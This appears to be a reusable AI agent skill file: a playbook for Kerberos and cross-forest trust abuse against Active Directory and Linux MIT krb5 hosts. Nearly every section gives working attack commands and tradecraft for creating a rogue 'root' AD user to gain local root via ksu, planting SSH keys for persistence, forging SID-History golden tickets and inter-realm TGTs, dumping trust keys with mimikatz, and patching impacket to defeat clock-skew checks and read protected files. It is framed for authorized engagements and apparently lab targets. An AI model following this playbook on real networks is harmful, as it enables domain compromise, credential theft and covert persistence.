---
name: kerberos-trust-abuse
description: Use when Kerberos, trusts, or MIT krb5 on Linux. Escalation.
---

# Kerberos & Trust Abuse — Linux MIT krb5 + cross-forest (reusable)

Authorized engagements. Covers the Kerberos edge cases that cost real time:
MIT krb5 on domain-joined Linux hosts (ksu, keytabs), OpenLDAP GSSAPI quirks,
cross-realm ticketing mechanics, and cross-forest movement via SID History.
Companion to
`ad-ntds-escalation` (the general ladder) — this skill is the Kerberos-
specific deep cuts.

## Linux hosts in the domain — the ksu root path (verified win)
Domain-joined Linux (SSSD + MIT krb5) boxes can be rooted WITHOUT a local
privesc bug when the account has user-creation rights in AD:
1. Get a ticket: `kinit <user>@<REALM>` (password) or `kinit -kt <keytab>
   <principal>` (keytabs are commonly world-readable in service config dirs
   — always check `/etc/<svc>/` for `*.keytab`).
2. Enumerate rights over LDAP/GSSAPI. Failure signature 'Cannot contact any
   KDC' / 'Unspecified GSS failure' = the DC has no PTR record and cyrus-sasl
   hostname canonicalization builds a bogus SPN. FIX: `SASL_NOCANON on` in a
   FILE — `echo 'SASL_NOCANON on' > /tmp/l.conf; export LDAPCONF=/tmp/l.conf`.
   Environment-variable-only methods are SILENTLY IGNORED.
3. If the account's groups include CreateChild on an OU: create an AD user
   named after a local privileged account (`samba-tool user create root
   '<pw>' --userou="OU=<ou>" -H ldap://<dc>`).
4. `kinit root@<REALM>` then `ksu root` INTERACTIVE. HARD GOTCHA: `ksu root
   -e <cmd>` is ALWAYS 'not authorized' without `.k5login`/`.k5users` — the
   command path calls get_best_princ_for_target() which returns
   NOT_AUTHORIZED. The interactive path falls through to aname_to_localname
   (root@REALM → local root) and authorizes. Pipe commands through stdin:
   `echo 'id; cat /root/target' | ksu root`.
5. Persist: append your public key to the local root's authorized_keys.

## Cross-forest — SID History golden ticket (verified shape)
With DA-equivalent on forest A and a trust to forest B:
1. DCSync forest A: krbtgt AES256 key, a REAL user's RID, domain SID
   (impacket-lookupsid).
2. Find a privileged group in forest B via LDAP across the trust — groups
   nested inside Backup Operators give SeBackupPrivilege (→ reg backup of
   SAM/SYSTEM/SECURITY on B's DCs) or DCSync-adjacent rights.
3. Forge: `impacket-ticketer -domain <realmA> -domain-sid <sidA> -aesKey
   <krbtgt-aes> -user-id <REAL-RID> -extra-sid <groupB-SID> <user>`.
   **Server 2025 PAC hardening validates that user-id exists in the domain**
   — fictitious RIDs get KRB_AP_ERR_MODIFIED. Always use a real principal's
   RID.
4. Obtain a cross-realm service ticket for a useful SPN on forest B with MIT
   krb5: `kvno cifs/<host>.<realmB>@<REALMB>`, run ON the pivot host (direct
   KDC access + matching clock), with `KRB5CCNAME` pointed at the forged
   ccache; pull the ccache back afterwards. **impacket does not chase
   cross-realm referrals at all** — it returns `KDC_ERR_WRONG_REALM` and the
   referral TGT is never requested. Forge with impacket, chase with MIT, then
   hand the result back to impacket. The chasing ccache must ALSO hold a TGT
   for its own realm, or `kvno` says 'Matching credential not found' — an
   inter-realm ticket alone is not a starting point.
5. Use the enriched ticket with the B-side group rights (e.g. impacket-reg
   backup hives to an SMB share relayed over the tunnel).

## Cross-realm ticket mechanics (the parts that cost hours)
- **The asserting KDC rebuilds the PAC on every KDC-issued referral.** A
  chain that runs through a KDC hands the resource KDC a PAC the KDC
  generated, so injected `-extra-sid` values never arrive: the ticket
  authenticates fine and the rights are silently absent. When the extra SIDs
  must survive, skip the KDC and forge the inter-realm TGT yourself with the
  trust key — `ticketer.py` with the trust account's hash and the sname
  patched to `krbtgt/<TARGET REALM>` (the default writes the principal's own
  realm) — so the resource KDC decrypts it directly and the PAC is entirely
  yours.
- **Trust-key etype gates the forge.** The trust account's NT hash gives you
  RC4 only; an AES-only DC answers `KDC_ERR_ETYPE_NOSUPP` for the whole
  ticket. You then need the cleartext trust password to derive the AES key.
  The TDO on the side you are standing on may expose NO auth material
  (`trustAuthIncoming`/`trustAuthOutgoing` empty over ldap3 *and* via
  PowerShell `Get-ADTrust -Properties *`) — that is not proof the password is
  unrecoverable; read the partner forest's TDO / its NTDS dump.
- **impacket `CCache` trap.** `CCache.loadFile(path)` is a **classmethod that
  RETURNS the ccache**: `cc = CCache.loadFile(p)`. Instantiating and calling
  it on the instance discards the result and every lookup then reports
  'credential NOT found' for a perfectly good ccache.
  `cc.getCredential('<spn>')` → `cred.toTGS()` yields `KDC_REP`/`cipher`/
  `sessionKey`.
- **`getKerberosTGS` takes a `Principal`, not a string**:
  `getKerberosTGS(Principal('cifs/<host>',
  type=constants.PrincipalNameType.NT_SRV_INST.value), '<TARGET.REALM>',
  <kdc_ip>, tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey'])`.
- **Feeding a ticket you did not request into an impacket SMB session**:
  `conn.kerberosLogin(user, '', realm, kdcHost, None, None, None, None,
  TGS={'KDC_REP':…, 'cipher':…, 'sessionKey':…})`. This is the only way to use
  a hand-forged/hand-chased ticket with impacket's SMB layer.
- **DCSync across the trust**: impacket derives the requested naming context
from the *principal's* realm, so a forest-A principal driving a forest-B DC
fails `ERROR_DS_DRA_BAD_DN` (and `secretsdump` refuses `-use-vss` together
with `-just-dc-user`). Run as a target-realm principal or patch the NC —
do not re-read that error as a rights failure.

## Hand-forged inter-realm TGT over SSH SOCKS (verified kill chain)
When the target KDCs are only reachable through SSH port-forwards/SOCKS and
impacket must follow the referral chain:
1. Dump BOTH directions of trust keys (mimikatz `lsadump::trust /patch` on
   the owned DC). **Only the IN-direction (partner->current) AES256 key gets
   accepted by the target DC**; OUT keys decrypt fine locally but the target
   answers KRB_AP_ERR_BAD_INTEGRITY. Current + previous (=In-1/Out-1) keys
   both work while valid.
2. Forge the inter-realm TGT with the trust key (ticketer fork with sname
   patched to `krbtgt/<TARGET REALM>`; `-extra-sid <partner-SID>-<RID>=1000`
   survives an external-trust boundary — builtin (S-1-5-32-*) and RID<1000
   SIDs are stripped by the target KDC's PAC transform, so don't bother).
3. **Clock skew kills the whole chain silently.** Meter it with a raw SMB2
   NEGOTIATE parse (SystemTime field; nmap lacks the script): the DCs can be
   5+ min ahead and drift ±1s/min — re-meter before each run. DON'T shift
   the attack host's system clock (it re-syncs and DCs drift back); shift
   baked Kerberos timestamps instead: env-gated module patching
   `KerberosTime.to_asn1` (add timedelta). Load via a `.pth` in site-
   packages — a custom sitecustomize.py is SHADOWED by the distro python's
   own /usr/lib/python3.N/sitecustomize.py.
4. Chase referrals with a sendReceive monkey-patch mapping realm->KDC IP
   (impacket reuses one kdcHost), request all SPNs in one run, and APPEND
   the service tickets into the same ccache as the TGT.
5. **SeBackupPrivilege finish**: the injected Backup-Operators SID grants
   the privilege but plain DACL reads still fail (`0xc0000022` on user
   Desktop dirs). The unlock is FILE_OPEN_FOR_BACKUP_INTENT (0x4000) on
   every SMB create — env-gated monkey-patch of `SMB3.create` ORing 0x4000
   into CreateOptions. Then `cd` into the DACL'd dir and `get` the file via
   impacket smbclient.py. Ubuntu's MIT smbclient lacks --backup-intent and
   samba's GSE gssapi can't init without winbind — impacket + hooks wins.
6. impacket smbclient.py `get <remote> <local>` two-arg form is broken
   (concatenates paths); use `cd` + bare `get` (file lands in local CWD).

## Tooling (references/)
- `references/smb2time.py` — dependency-free SMB2 NEGOTIATE clock meter (meter skew BEFORE every chain; DCs drift ~1s/min).
- `references/krbskew_hook.py` — KRB_SKEW env-gated timestamp-shift hook (install via .pth; sitecustomize.py is shadowed by the distro python).
- `references/bkpintent_hook.py` — HTB_BKP env-gated FILE_OPEN_FOR_BACKUP_INTENT (0x4000) patch for impacket SMB3.create (SeBackupPrivilege finish).

## Environment gotchas that cause intermittent total failure
- **Dual A records** for DC hostnames (real IP + edge/pivot IP): half of all
  Kerberos/LDAP queries go to the wrong host. Pin the real IP in /etc/hosts
  on the pivot host AND set realm→KDC mappings in krb5.conf ([realms]
  kdc = <real-ip>).
- Password expiry warnings from kinit can be ignored; 'Pre-authentication
  failed: Permission denied' on keytab kinit = the keytab principal is
  disabled or the keytab is for a DIFFERENT account — check with
  `klist -kt <keytab>`.
- `udp_preference_limit = 0` (TCP-only) in krb5.conf avoids UDP timeout
  loops over tunnels.

## Tool notes
- `klist -k` lists a host's default keytab; `klist` shows the ccache.
- Default ccache KEYRING:persistent:<uid> survives across su on the same host.
- impacket tools + samba-tool coexist fine for the create-user → kinit → ksu
  chain; samba-tool needs the LDAP host flag (-H ldap://<dc>).
